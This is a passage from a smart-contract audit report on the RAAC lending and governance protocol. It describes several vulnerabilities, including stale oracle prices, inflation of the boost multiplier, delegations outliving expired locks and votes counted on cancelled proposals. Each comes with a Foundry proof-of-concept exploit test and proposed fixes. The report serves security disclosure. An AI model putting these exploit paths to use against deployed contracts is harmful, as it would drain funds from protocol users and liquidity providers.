        (uint256 totalBoost, uint256 workingSupply, , ) = boostController.getPoolBoost(pool);
        
        console2.log("\nAfter Bob's boost update:");
        console2.log("Bob's boost amount:", bobBoostAmount);
        console2.log("Pool total boost:", totalBoost);
        console2.log("Pool working supply:", workingSupply);
        
        // Step 2: Alice updates her boost
        vm.prank(alice);
        boostController.updateUserBoost(alice, pool);
        
        // Get Alice's boost info and updated pool info
        (uint256 aliceBoostAmount, , , ) = boostController.getUserBoost(alice, pool);
        (totalBoost, workingSupply, , ) = boostController.getPoolBoost(pool);
        
        console2.log("\nAfter Alice's boost update:");
        console2.log("Alice's boost amount:", aliceBoostAmount);
        console2.log("Bob's boost amount:", bobBoostAmount);
        console2.log("Pool total boost:", totalBoost);
        console2.log("Pool working supply:", workingSupply);
        
        // Demonstrate the vulnerability
        assertLt(
            workingSupply,
            bobBoostAmount + aliceBoostAmount,
            "Working supply should be less than sum of boosts (overwritten)"
        );
        
        console2.log("\nVulnerability demonstrated:");
        console2.log("Expected working supply:", bobBoostAmount + aliceBoostAmount);
        console2.log("Actual working supply:", workingSupply);
        console2.log("Missing boost amount:", bobBoostAmount + aliceBoostAmount - workingSupply);
    }
```

Impact
This vulnerability has severe implications:

### Economic Impact:

Incorrect reward calculations due to understated working supply

Users lose their boost effects when others update

Potential for manipulation of reward distributions

The working supply is used to calculate user rewards/shares in the pool

When overwritten, it understates the total working supply, leading to incorrect reward distributions

Only the last user's boost is considered in the working supply while total boost tracks correctly

Users get larger share of rewards than they should because workingSupply is understated

Last user to update gets disproportionate rewards since their boost becomes the entire workingSupply

Earlier users' boosts are effectively ignored in reward calculations

// From POC:
// Bob updates first - workingSupply = bobBoost
// Alice updates second - workingSupply = aliceBoost (Bob's boost lost)
// But totalBoost = bobBoost + aliceBoost (correct)
​
​
This means:
If totalRewards = 1000
Bob's boost = 400
Alice's boost = 600
Working supply = 600 (Alice's only)
Total boost = 1000 (correct)
Alice would get: (600 * 1000) / 600 = 1000 rewards
Instead of correct: (600 * 1000) / 1000 = 600 rewards
​
Attacker Would time their boost updates to be the last updater
Tools Used
### Recommendations
similar to how totalboost is adjusted, do same for workingsupply.



 ```solidity     
    function updateUserBoost(address user, address pool) external override nonReentrant whenNotPaused {
        if (paused()) revert EmergencyPaused();
        if (user == address(0)) revert InvalidPool(); 
        if (!supportedPools[pool]) revert PoolNotSupported();
        
        UserBoost storage userBoost = userBoosts[user][pool];
        PoolBoost storage poolBoost = poolBoosts[pool];
        
        uint256 oldBoost = userBoost.amount;
        // Calculate new boost based on current veToken balance
        uint256 newBoost = _calculateBoost(user, pool, 10000); // Base amount //check here thoroughly audit;isue 7
        
        userBoost.amount = newBoost;
        userBoost.lastUpdateTime = block.timestamp;
        
        // Update pool totals safely
        if (newBoost >= oldBoost) {
            poolBoost.totalBoost = poolBoost.totalBoost + (newBoost - oldBoost);
          + poolBoost.workingSupply = poolBoost.workingSupply + (newBoost - oldBoost);
        } else {
            poolBoost.totalBoost = poolBoost.totalBoost - (oldBoost - newBoost);
          + poolBoost.workingSupply = poolBoost.workingSupply - (oldBoost - newBoost);
        }
    
  
        poolBoost.lastUpdateTime = block.timestamp;
        
        emit BoostUpdated(user, pool, newBoost);
        emit PoolBoostUpdated(pool, poolBoost.totalBoost, poolBoost.workingSupply);
     } 
```


## [M-07] Lack of staleness price check in `RAACHousePrices.sol`.
### Description

The RAACHousePrices.sol contract lacks a staleness check mechanism for price updates, allowing outdated price data to be considered valid indefinitely. This would lead to significant economic damage as the system continues to use potentially severely outdated price information for critical financial operations.

### Vulnerability Details
The vulnerability exists in two key functions:
```solidity 
// In RAACHousePrices.sol
function setHousePrice(uint256 tokenId, uint256 price) external {
    // Sets price but doesn't enforce update frequency
}
​
function getLatestPrice(uint256 tokenId) external view returns (uint256, uint256) {
    // Returns price without checking staleness
}
```

### Proof of code:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "../../../../contracts/core/primitives/RAACHousePrices.sol";
​
contract RAACHousePricesTest is Test {
    RAACHousePrices public housePrices;
    address owner = address(1);
    address oracle = address(2);
    address attacker = address(3);
    address user = address(4);
​
    event PriceUpdated(uint256 tokenId, uint256 newPrice);
​
    function setUp() public {
        // Deploy with owner
        housePrices = new RAACHousePrices(owner);
        
        // Set oracle
        vm.prank(owner);
        housePrices.setOracle(oracle);
    }
​
    // POC 1: Stale Price Vulnerability
    function testStalePriceVulnerability() public {
        uint256 tokenId = 1;
        uint256 price = 100 ether;
​
        // Oracle sets initial price
        vm.prank(oracle);
        housePrices.setHousePrice(tokenId, price);
​
        // Fast forward 1 year
        vm.warp(block.timestamp + 365 days);
​
        // User can still get price without any staleness check
        (uint256 returnedPrice, uint256 lastUpdate) = housePrices.getLatestPrice(tokenId);
        
        // Price is still considered valid even though extremely old
        assertEq(returnedPrice, price);
        assertLt(lastUpdate, block.timestamp - 364 days);
        
        // In a real scenario, this could lead to:
        // 1. Users getting loans with outdated collateral values
        // 2. Incorrect liquidations
        // 3. Mispriced asset purchases/sales
    }
  }
```

The test demonstrates that:

// Oracle sets initial price
```solidity 
vm.prank(oracle);
housePrices.setHousePrice(tokenId, price);
​
// Fast forward 1 year
vm.warp(block.timestamp + 365 days);
​
// Price still considered valid after a year
(uint256 returnedPrice, uint256 lastUpdate) = housePrices.getLatestPrice(tokenId);
assertEq(returnedPrice, price);
```

### Impact
The lack of staleness checks can lead to:

Incorrect collateral valuations in lending

Mispriced liquidations

Unfair asset trades

System-wide economic imbalances

Potential for market manipulation

Tools Used
### Recommendations
Add a stale price check

## [M-08] Lack of stale price check can lead to bad debt in `Lendingpool.sol`
### Description

LendingPool.sol contains a critical vulnerability related to stale price data usage in its collateral valuation system. It fails to validate the freshness of price data from the oracle, allowing users to exploit outdated prices to create bad debt positions. This vulnerability is particularly dangerous because:

Users can borrow against collateral values that no longer reflect market reality

The system accepts NFT deposits and calculates borrowing power using potentially outdated price data

When prices are finally updated, positions can become severely underwater

The liquidation mechanism becomes ineffective because the collateral value is less than the borrowed amount

This creates unrecoverable bad debt in the protocol

Imagine getting a loan on your house using its value from 5 years ago, even though the current market price has dropped significantly. The bank would be giving you more money than your house is actually worth, creating a risky situation where you owe more than your collateral is worth.

### Vulnerability Details
Price Oracle Implementation:
```solidity 
function getNFTPrice(uint256 tokenId) public view returns (uint256) {
    (uint256 price, uint256 lastUpdateTimestamp) = priceOracle.getLatestPrice(tokenId);
    if (price == 0) revert InvalidNFTPrice();
    return price;  // No staleness check on lastUpdateTimestamp
}
Deposit and Borrow Flow:

function depositNFT(uint256 tokenId) external nonReentrant whenNotPaused {
    // Accepts NFT without checking price freshness
    UserData storage user = userData[msg.sender];
    user.nftTokenIds.push(tokenId);
    user.depositedNFTs[tokenId] = true;
}
​
function borrow(uint256 amount) external nonReentrant whenNotPaused {
    uint256 collateralValue = getUserCollateralValue(msg.sender);
    // Uses potentially stale prices for collateral valuation
    if (collateralValue.percentMul(liquidationThreshold) < amount) {
        revert InsufficientCollateral();
    }
}
```

## Proof of code:

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "../../../../../contracts/core/pools/LendingPool/LendingPool.sol";
import "../../../../../contracts/core/tokens/RToken.sol";
import "../../../../../contracts/core/tokens/DebtToken.sol";
import "../../../../../contracts/core/tokens/RAACNFT.sol";
import "../../../../../contracts/core/primitives/RAACHousePrices.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
​
// Add after imports
interface ILendingPoolErrors {
    error DebtNotZero();
    error Unauthorized();
    error GracePeriodNotExpired();
}
​
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {
        _mint(msg.sender, 1000000 ether);
    }
}
​
contract LendingPoolTest is Test, ILendingPoolErrors {
 
    
    LendingPool public lendingPool;
    RToken public rToken;
    DebtToken public debtToken;
    RAACNFT public nft;
    RAACHousePrices public priceOracle;
    MockERC20 public mockToken;
​
    address owner = address(1);
    address user = address(2);
    address oracle = address(3);
    address attacker = address(4);
    address liquidator = address(5);
    address stabilityPool = address(6);
​
    event NFTDeposited(address indexed user, uint256 indexed tokenId);
    event NFTWithdrawn(address indexed user, uint256 indexed tokenId);
​
    uint256 constant LIQUIDATION_GRACE_PERIOD = 1 days; // Match value from LendingPool
​
    function setUp() public {
        // Deploy mock token
        mockToken = new MockERC20();
​
        // Transfer initial tokens
        deal(address(mockToken), address(this), 10000 ether);
        deal(address(mockToken), user, 1000 ether);
​
        vm.startPrank(owner);
​
        // Deploy price oracle
        priceOracle = new RAACHousePrices(owner);
        priceOracle.setOracle(oracle);
​
        // Deploy NFT
        nft = new RAACNFT(address(mockToken), address(priceOracle), owner);
​
        // Deploy tokens and pool
        rToken = new RToken("RToken", "RT", owner, address(mockToken));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        lendingPool = new LendingPool(
            address(mockToken),
            address(rToken),
            address(debtToken),
            address(nft),
            address(priceOracle),
            1e27
        );
​
        // Setup permissions
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
​
        // Give owner tokens and deposit
        deal(address(mockToken), owner, 1000 ether);
        mockToken.approve(address(lendingPool), 1000 ether);
        lendingPool.deposit(1000 ether);
​
        // Set stability pool
        lendingPool.setStabilityPool(stabilityPool);
​
        vm.stopPrank(); // Stop the owner prank session
    }
​
​
    function testStalePriceManipulationBadDebt() public {
        // Setup initial state
        uint256 initialPrice = 100 ether;
        uint256 borrowAmount = 70 ether;
        
        // Give attacker initial tokens to mint NFT
        deal(address(mockToken), attacker, initialPrice);
        
        // 1. Oracle sets initial legitimate price
        vm.prank(oracle);
        priceOracle.setHousePrice(1, initialPrice);
        
        // 2. Time passes, market conditions change but price isn't updated
        // Protocol doesn't check for stale prices!
        vm.warp(block.timestamp + 30 days);
        
        // 3. Attacker exploits stale price
        vm.startPrank(attacker);
        mockToken.approve(address(nft), initialPrice);
        nft.mint(1, initialPrice);
        nft.approve(address(lendingPool), 1);
        
        // depositNFT() uses stale price for collateral value
        lendingPool.depositNFT(1); // Accepts 100 ETH valuation
        
        // borrow() calculates maxBorrow using stale price
        // maxBorrow = 100 ETH * 0.7 = 70 ETH
        lendingPool.borrow(borrowAmount); 
        vm.stopPrank();
        
        // 4. Oracle finally updates to real market price
        vm.prank(oracle);
        priceOracle.setHousePrice(1, 50 ether); // Real market value
        
        // 5. Show position is underwater
        uint256 healthFactor = lendingPool.calculateHealthFactor(attacker);
        assertLt(healthFactor, lendingPool.healthFactorLiquidationThreshold());
        
        // 6. Liquidation Process
        // First initiate liquidation
        vm.prank(liquidator);
        lendingPool.initiateLiquidation(attacker);
        
        // Attacker can't close liquidation because debt > dust threshold
        vm.startPrank(attacker);
        vm.expectRevert(DebtNotZero.selector);
        lendingPool.closeLiquidation();
        vm.stopPrank();
        
        // Wait for grace period to expire
        vm.warp(block.timestamp + LIQUIDATION_GRACE_PERIOD + 1 days);
        
        // Try to finalize liquidation from stability pool
        vm.startPrank(stabilityPool);
        vm.expectRevert(GracePeriodNotExpired.selector);
        lendingPool.finalizeLiquidation(attacker);
        vm.stopPrank();
        
        // 7. Show bad debt exists and can't be recovered
        uint256 collateralValue = 50 ether; // Real value
        uint256 totalDebt = borrowAmount;   // 70 ETH borrowed
        assertTrue(totalDebt > collateralValue);
        
        // Protocol is stuck because:
        // 1. Used stale price for collateral valuation
        // 2. Allowed borrow based on stale price
        // 3. User can't close liquidation (debt too high)
        // 4. Only stability pool can finalize
        // 5. No incentive to liquidate (20 ETH loss)
    }
} 
```
The test demonstrates the exploit path:

### Initial Setup:

// Oracle sets initial price at 100 ETH
```solidity 
priceOracle.setHousePrice(1, 100 ether);
​
// Time passes (30 days) without price updates
vm.warp(block.timestamp + 30 days);
Exploit Execution:

// Attacker deposits NFT at stale high price
lendingPool.depositNFT(1);
​
// Borrows 70 ETH against 100 ETH valuation
lendingPool.borrow(70 ether);
​
// Price updates to real value of 50 ETH
priceOracle.setHousePrice(1, 50 ether);
```

Result:

Collateral value: 50 ETH

Borrowed amount: 70 ETH

Position is underwater by 20 ETH

Cannot be liquidated effectively due to insufficient collateral value

### Impact
Financial Impact:

Protocol suffers unrecoverable bad debt

Liquidity providers lose funds

System becomes undercollateralized

Protocol Solvency:

Accumulation of bad debt

Inability to maintain proper collateralization ratios

Risk of protocol bankruptcy

Tools Used
## Recommendations
Implement Price Freshness Check:

----


----

----


## [L-01] Invariant broken in `getBoostMultiplier.sol` in the BoostController contract.
### Description

precision loss occurs in the getBoostMultiplier function of the BoostController contract. Specifically, the function's calculation of the boost multiplier would lead to a situation where the resulting value exceeds MAX_BOOST, violating key system invariants. This occurs due to an incorrect denominator in the division operation, which can cause an unintended amplification of the boost multiplier, particularly for specific values of userBoost.amount.

### Vulnerability Details
Affected Function: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L282

```solidity
function getBoostMultiplier(
    address user,
    address pool
) external view override returns (uint256) {
    if (!supportedPools[pool]) revert PoolNotSupported();
    UserBoost storage userBoost = userBoosts[user][pool];
    if (userBoost.amount == 0) return MIN_BOOST; //10000
    
    // Calculation flaw - Incorrect baseAmount computation
    uint256 baseAmount = userBoost.amount * 10000 / MAX_BOOST; //25000
    return userBoost.amount * 10000 / baseAmount;
}
```

This function is designed to compute a boost multiplier based on userBoost.amount and return it in basis points (1e4).

The issue arises due to the incorrect calculation of baseAmount:

uint256 baseAmount = userBoost.amount * 10000 / MAX_BOOST;
This step performs a scaling operation, but when userBoost.amount takes specific values (such as 333, 499, 999), it introduces precision loss due to integer division and users with this amount gets more rewards.

The final calculation:
```solidity 
return userBoost.amount * 10000 / baseAmount;
```
would cause the return value to exceed MAX_BOOST, violating expected constraints.

### Proof of Concept (PoC);
I added the senario for value 333, and other user amounts that would cause this issue. Invariant is completely broken:

https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L39C4-L40C47

 /// @notice Maximum boost multiplier (2.5x) in basis points
 ```solidity 
    uint256 public constant MAX_BOOST = 25000;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {BoostController} from "../../../../../contracts/core/governance/boost/BoostController.sol";
import {veRAACToken} from "../../../../../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract BoostControllerTest is Test {
    BoostController public boostController;
    veRAACToken public veToken;
    RAACToken public raacToken;
    
    address public alice = address(0x1);
    address public bob = address(0x2);
    address public pool = address(0x3);
    address public owner = address(this);
​
    function setUp() public {
        // Deploy real RAAC token with initial parameters
        raacToken = new RAACToken(
            owner,      // initial owner
            100,        // 1% swap tax
            50          // 0.5% burn tax
        );
        
        // Deploy veToken
        veToken = new veRAACToken(address(raacToken));
        
        // Deploy BoostController
        boostController = new BoostController(address(veToken));
        
        // Setup roles and permissions
        boostController.modifySupportedPool(pool, true);
        raacToken.setMinter(owner);
        
        // Mint tokens to users
        raacToken.mint(alice, 1000e18);
        raacToken.mint(bob, 5000e18);
        
        // Whitelist users to avoid tax on transfers
        raacToken.manageWhitelist(alice, true);
        raacToken.manageWhitelist(bob, true);
        raacToken.manageWhitelist(address(veToken), true);
        
        // Setup users
        vm.startPrank(alice);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(1000e18, 365 days); // Lock for 1 year
        vm.stopPrank();
        
        vm.startPrank(bob);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(5000e18, 365 days); // Lock for 1 year
        vm.stopPrank();
    }
​
​
    function testMax_boost_breach() public {
        
        uint256 breachAmount = 333;
        
        // Setup user with breach amount
        raacToken.mint(alice, breachAmount * 1e18);
        
        vm.startPrank(alice);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(breachAmount * 1e18, 365 days);
        boostController.updateUserBoost(alice, pool);
        vm.stopPrank();
        
        uint256 multiplier = boostController.getBoostMultiplier(alice, pool);
        
        // Verify the broken invariant
        assertGt(
            multiplier,
            boostController.MAX_BOOST(),
            "Multiplier should not exceed MAX_BOOST"
        );
        
        // Verify impact on rewards
        uint256 dailyRewards = 1000e18;
        uint256 expectedMaxRewards = (dailyRewards * boostController.MAX_BOOST()) / 10000;
        uint256 actualRewards = (dailyRewards * multiplier) / 10000;
        
        assertGt(
            actualRewards,
            expectedMaxRewards,
            "Rewards exceed maximum allowed"
        );
    } 
  
    function testMax_boost_breach_multiple_amounts() public {
        uint256[] memory testAmounts = new uint256[](3);
        testAmounts[0] = 333;
        testAmounts[1] = 499;
        testAmounts[2] = 999;
        
        for(uint256 i = 0; i < testAmounts.length; i++) {
            uint256 breachAmount = testAmounts[i];
            
            // Setup user with breach amount
            raacToken.mint(alice, breachAmount * 1e18);
            
            vm.startPrank(alice);
            raacToken.approve(address(veToken), type(uint256).max);
            veToken.lock(breachAmount * 1e18, 365 days);
            boostController.updateUserBoost(alice, pool);
            vm.stopPrank();
            
            uint256 multiplier = boostController.getBoostMultiplier(alice, pool);
            
            // Verify the broken invariant
            assertGt(
                multiplier,
                boostController.MAX_BOOST(),
                string.concat("Multiplier should not exceed MAX_BOOST for amount: ", vm.toString(breachAmount))
            );
            
            // Verify impact on rewards
            uint256 dailyRewards = 1000e18;
            uint256 expectedMaxRewards = (dailyRewards * boostController.MAX_BOOST()) / 10000;
            uint256 actualRewards = (dailyRewards * multiplier) / 10000;
            
            assertGt(
                actualRewards,
                expectedMaxRewards,
                string.concat("Rewards exceed maximum allowed for amount: ", vm.toString(breachAmount))
            );
            
        }
    }
}
```
​
​
### Why do this happens?
Integer division causes truncation, leading to unintended behavior in the calculation of baseAmount.

When userBoost.amount is 333,499,999 baseAmount gets truncated to a much smaller value.

As a result, dividing userBoost.amount * 10000 by baseAmount leads to an inflated return value.

This allows an attacker to gain an unintended higher boost multiplier, breaking system invariants.

### Impact
Boost Multiplier Inflation:

The function would return as seen a value higher than MAX_BOOST, causing unintended reward calculations.

Attackers with specific deposit amounts would manipulate their boost multipliers beyond the intended limit.

Reward Exploitation:

Since rewards are computed using the boost multiplier, an attacker would earn a disproportionately high reward share.

This results in unfair distribution and economic imbalances in the system.

System Integrity Violation:

The contract assumes MAX_BOOST is an upper bound, which is violated by this flaw.

Tools Used
### Recommendations
Fix the Calculation Logic

The correct calculation should prevent integer division from introducing precision loss:
```solidity 
function getBoostMultiplier(
    address user,
    address pool
) external view override returns (uint256) {
    if (!supportedPools[pool]) revert PoolNotSupported();
    UserBoost storage userBoost = userBoosts[user][pool];
    if (userBoost.amount == 0) return MIN_BOOST;
    
    // Corrected Calculation
   + uint256 baseAmount = (userBoost.amount * 10000 + MAX_BOOST - 1) / MAX_BOOST; // Ensure rounding up
   + return (userBoost.amount * 10000) / baseAmount;
}
```

## [L-02] Delegated boosts remain active after the underlying veToken lock expires & obtain boosts in `BoostController.sol`
### Description

Two critical vulnerabilities exists in the BoostController's delegation function:

Delegated boosts remain active after the underlying veToken lock expires

Receivers can continue using expired delegations to obtain boosts

Both vulnerabilities stem from insufficient validation in the delegateBoost() function and related delegation checks.

The function fails to calculate the remaining time of a particular boost after being delegated.

### Vulnerability Details
Root Cause Analysis
1. Lock Expiry Not Validated: https://github.com/Cyfrin/2025-02-raac/blob/89ccb062e2b175374d40d824263a4c0b601bcb7f/contracts/core/governance/boost/BoostController.sol#L212

```solidity
function delegateBoost(address to, uint256 amount, uint256 duration) external {
    // Only checks current balance
    uint256 userBalance = IERC20(address(veToken)).balanceOf(msg.sender);
    if (userBalance < amount) revert InsufficientVeBalance();
    
    // No validation of lock expiry time
    delegation.expiry = block.timestamp + duration;
}
```

Only validates current veToken balance

Doesn't check delegator's lock expiry

No link between delegation expiry and lock expiry

No ongoing validation of lock status

. 2. Expired Delegation Usage:

// In updateUserBoost():
// Missing validation of:
// 1. Delegation expiry
// 2. Underlying lock validity
// 3. Continuous balance checks

### Proof of code:

Add this code to your test file and run it:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {BoostController} from "../../../../../contracts/core/governance/boost/BoostController.sol";
import {veRAACToken} from "../../../../../contracts/core/tokens/veRAACToken.sol";
import {RAACToken} from "../../../../../contracts/core/tokens/RAACToken.sol";
​
contract BoostControllerDelegationTest is Test {
    BoostController public boostController;
    veRAACToken public veToken;
    RAACToken public raacToken;
    
    address public delegator = address(0x1);
    address public receiver = address(0x2);
    address public pool = address(0x3);
    address public owner = address(this);
​
    function setUp() public {
        // Deploy contracts
        raacToken = new RAACToken(owner, 100, 50);
        veToken = new veRAACToken(address(raacToken));
        boostController = new BoostController(address(veToken));
        
        // Setup permissions
        boostController.modifySupportedPool(pool, true);
        raacToken.setMinter(owner);
        
        // Mint and setup delegator
        raacToken.mint(delegator, 1000e18);
        raacToken.manageWhitelist(delegator, true);
        raacToken.manageWhitelist(address(veToken), true);
        
        vm.startPrank(delegator);
        raacToken.approve(address(veToken), type(uint256).max);
        veToken.lock(1000e18, 365 days); // Lock for 1 year
        vm.stopPrank();
    }
​
    function testDelegateBoostVulnerabilities() public {
        uint256 veTokenBalance = veToken.balanceOf(delegator);
        
        // 1. Initial delegation
        vm.startPrank(delegator);
        boostController.delegateBoost(receiver, veTokenBalance/2, 30 days);
        vm.stopPrank();
​
        // Get initial boost state
        (uint256 initialAmount, uint256 initialExpiry,,) = boostController.getUserBoost(delegator, receiver);
        console.log("Initial delegation amount:", initialAmount);
        console.log("Initial expiry:", initialExpiry);
​
        // 2. Move past lock expiry (365 days + 1)
        vm.warp(block.timestamp + 366 days);
​
        // Check delegation is still active despite expired lock
        (uint256 amount, uint256 expiry,,) = boostController.getUserBoost(delegator, receiver);
        console.log("\nAfter lock expiry:");
        console.log("Delegation amount:", amount);
        console.log("Delegation expiry:", expiry);
        console.log("Current time:", block.timestamp);
        
        // Verify delegation is still active when it shouldn't be
        assertGt(amount, 0, "Delegation should be invalid after lock expires but isn't");
        assertLt(expiry, block.timestamp, "Delegation should be expired");
​
        // 3. Receiver can still use expired delegation
        vm.prank(receiver);
        boostController.updateUserBoost(receiver, pool);
        
        (uint256 receiverBoost,,,) = boostController.getUserBoost(receiver, pool);
        console.log("\nReceiver boost after lock expiry:", receiverBoost);
        
        // The vulnerability: Receiver gets boost from expired delegation
        assertGt(receiverBoost, 0, "Receiver shouldn't get boost from expired lock but does");
    }
} 
```

### Impact
1. Lock Expiry Bypass
Delegations continue after lock expiry

Undermines the entire veToken locking mechanism

Allows unauthorized boost allocation

Could lead to infinite delegation periods

### Exploitation Path:

1. User locks tokens for 365 days
2. Delegates boost for 30 days
3. Lock expires after 365 days
4. Delegation remains active
5. Delegate maintains boost power without active lock
. 2. Expired Delegation Usage:
Receivers maintain boost power indefinitely

### Exploitation Path:

1. Receiver gets delegation for 30 days
2. After 30 days (expiry) or 365 days (lock expiry)
3. Can still call updateUserBoost()
4. Continues receiving boost benefits
5. Original delegator loses control
My POC shows the complete exploitation path:

Initial setup with valid lock and delegation

Time manipulation to demonstrate expiry

Proof that delegation remains active

Proof that receiver can still use the expired delegation

Tools Used
### Recommendations
Implement Lock Expiry Validation.

```solidity
function delegateBoost(address to, uint256 amount, uint256 duration) external {
    // Get lock expiry
    uint256 lockExpiry = veToken.getLockExpiry(msg.sender);
    
    // Ensure delegation doesn't exceed lock
  +   require(block.timestamp + duration <= lockExpiry, "Delegation exceeds lock");
    
    // Existing checks...
    uint256 userBalance = IERC20(address(veToken)).balanceOf(msg.sender);
    require(userBalance >= amount, "Insufficient balance");
    
    // Store lock expiry with delegation
   +  delegation.lockExpiry = lockExpiry;
}
```

## [L-03] Canceled vote still get voted on and accumulate voting power in `Goverance.sol`
### Description

In governance.sol vote handling after proposal cancellation. When a proposal is cancelled, the system still allows voting to occur and counts these votes, which should not be possible. This creates an inconsistent state where:

A proposal is be officially cancelled

Yet still accumulate votes

These votes are recorded and counted

The voting power is still tracked

The proposal remains in a state where it's simultaneously cancelled but actively collecting votes

This breaks the fundamental governance flow and security assumptions about proposal lifecycle management. Caused from missing state validation in the castVote() function, which doesn't properly check if a proposal is in a cancelled state before allowing votes.

### Vulnerability Details
The root cause is in the castVote() function's insufficient state validation:

```solidity
function castVote(uint256 proposalId, bool support) external override returns (uint256) {
    ProposalCore storage proposal = _proposals[proposalId];
    // Only checks timing, not cancelled state
    if (block.timestamp < proposal.startTime) {
        revert VotingNotStarted(proposalId, proposal.startTime, block.timestamp);
    }
    if (block.timestamp > proposal.endTime) {
        revert VotingEnded(proposalId, proposal.endTime, block.timestamp);
    }
    // Missing check for cancelled state
    // Should have: if (proposal.canceled) revert ProposalCancelled();
    ...
}
```

### Proof of code:

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../../contracts/core/governance/proposals/Governance.sol";
import "../../../../../contracts/core/governance/proposals/TimelockController.sol";
import "../../../../../contracts/interfaces/core/governance/proposals/IGovernance.sol";
import "../../../../../contracts/interfaces/core/tokens/IveRAACToken.sol";
import "../../../../../contracts/core/tokens/veRAACToken.sol";
​
contract MockRAACToken is ERC20 {
    constructor() ERC20("RAAC", "RAAC") {
        _mint(msg.sender, 10_000_000e18);
    }
}
​
contract GovernanceTest is Test {
    Governance public governance;
    TimelockController public timelock;
    veRAACToken public veToken;
    MockRAACToken public raacToken;
​
    address public admin = address(this);
    address public attacker = makeAddr("attacker");
    address[] public attackerAccounts;
    uint256 constant NUM_ACCOUNTS = 5;
​
    function setUp() public {
        raacToken = new MockRAACToken();
        veToken = new veRAACToken(address(raacToken));
        
        address[] memory proposers = new address[](1);
        address[] memory executors = new address[](1);
        proposers[0] = admin;
        executors[0] = admin;
        
        timelock = new TimelockController(2 days, proposers, executors, admin);
        governance = new Governance(address(veToken), address(timelock));
​
        timelock.grantRole(timelock.PROPOSER_ROLE(), address(governance));
        timelock.grantRole(timelock.EXECUTOR_ROLE(), address(governance));
​
        // Create multiple attacker accounts
        for(uint i = 0; i < NUM_ACCOUNTS; i++) {
            attackerAccounts.push(makeAddr(string.concat("attacker", vm.toString(i))));
            // Give each account enough tokens for their larger lock amount
            uint256 accountTokens = 200_000e18 * (i + 1);
            raacToken.transfer(attackerAccounts[i], accountTokens);
        }
​
        // Give extra tokens to attacker0 for the proposal
        raacToken.transfer(attackerAccounts[0], 500_000e18);
​
        // Label accounts for better trace readability
        vm.label(attackerAccounts[1], "legitimateUser");
        vm.label(attackerAccounts[0], "attacker");
    }
​
​
    function testVoteOnCanceledProposal() public {
        // Setup initial voting power for proposer
        vm.startPrank(attackerAccounts[0]);
        raacToken.approve(address(veToken), 500_000e18);
        veToken.lock(500_000e18, 1460 days);
        
        // Create proposal
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        
        uint256 proposalId = governance.propose(
            targets,
            values,
            calldatas,
            "Test Proposal",
            IGovernance.ProposalType.TreasuryAction
        );
​
        // Move to voting period
        vm.warp(block.timestamp + governance.votingDelay() + 1);
​
        // Cancel the proposal
        governance.cancel(proposalId);
        
        // Verify proposal is canceled
        assertEq(uint(governance.state(proposalId)), uint(IGovernance.ProposalState.Canceled));
​
        // But we can still vote on it!
        vm.stopPrank();
        
        // New voter tries to vote on canceled proposal
        vm.startPrank(attackerAccounts[1]);
        raacToken.approve(address(veToken), 200_000e18);
        veToken.lock(200_000e18, 1460 days);
        
        // This should revert but doesn't!
        governance.castVote(proposalId, true);
        
        // Check that vote was actually counted
        (uint256 forVotes, uint256 againstVotes) = governance.getVotes(proposalId);
        assertTrue(forVotes > 0, "Vote was counted on canceled proposal!");
        
        // Verify voter is marked as having voted
        assertTrue(governance.hasVoted(proposalId, attackerAccounts[1]), 
            "Vote was recorded for canceled proposal");
​
        console.log("\n=== Vote On Canceled Proposal Impact ===");
        console.log("Proposal State:", uint(governance.state(proposalId)));
        console.log("For Votes after cancel:", forVotes);
        console.log("Voter marked as voted:", governance.hasVoted(proposalId, attackerAccounts[1]));
        
        vm.stopPrank();
    }
  }
```

Flow:

Initial Setup and Proposal Creation:

```solidity 
vm.startPrank(attackerAccounts[0]);
raacToken.approve(address(veToken), 500_000e18);
veToken.lock(500_000e18, 1460 days);
​
uint256 proposalId = governance.propose(
    targets,
    values,
    calldatas,
    "Test Proposal",
    IGovernance.ProposalType.TreasuryAction
);
Proposal Cancellation:

governance.cancel(proposalId);
assertEq(uint(governance.state(proposalId)), uint(IGovernance.ProposalState.Canceled));
Post-Cancellation Voting (Should Not Be Possible):

vm.startPrank(attackerAccounts[1]);
raacToken.approve(address(veToken), 200_000e18);
veToken.lock(200_000e18, 1460 days);
governance.castVote(proposalId, true);  // This should revert but doesn't!
Vote Counting Still Active:

(uint256 forVotes, uint256 againstVotes) = governance.getVotes(proposalId);
assertTrue(forVotes > 0, "Vote was counted on canceled proposal!");
Vote Recording Still Active:

assertTrue(governance.hasVoted(proposalId, attackerAccounts[1]), 
    "Vote was recorded for canceled proposal");
The test output shows:

=== Vote On Canceled Proposal Impact ===
Proposal State: 2
For Votes after cancel: 200000000000000000000000
Voter marked as voted: true
```


Normal Scenario Should Be:

Proposal Created -> Active

Proposal Cancelled

All subsequent vote attempts should revert

No vote counting should occur

No vote recording should happen

Proposal should be permanently locked in cancelled state

Current Broken Scenario:

1. Proposal Created -> Active

Proposal Cancelled

Votes still accepted

Votes still counted

5. Votes still recorded

Proposal in inconsistent state (cancelled but accepting votes)

### Impact
